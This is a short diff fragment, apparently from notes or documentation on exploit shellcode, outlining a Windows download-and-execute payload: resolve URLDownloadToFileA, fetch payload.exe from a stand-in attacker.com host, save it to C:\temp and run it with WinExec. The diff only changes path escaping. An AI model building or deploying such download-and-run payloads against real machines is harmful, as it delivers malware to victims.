@@ -226,8 +226,8 @@ Steps:
 1. Find kernel32.dll base
 2. Find URLDownloadToFileA (urlmon.dll)
 3. Download: http://attacker.com/payload.exe
-4. Save to: C:\\temp\\payload.exe
-5. Execute: WinExec("C:\\temp\\payload.exe")
+4. Save to: C:\temp\payload.exe
+5. Execute: WinExec("C:\temp\payload.exe")
 
 Size: ~400 bytes
 ```
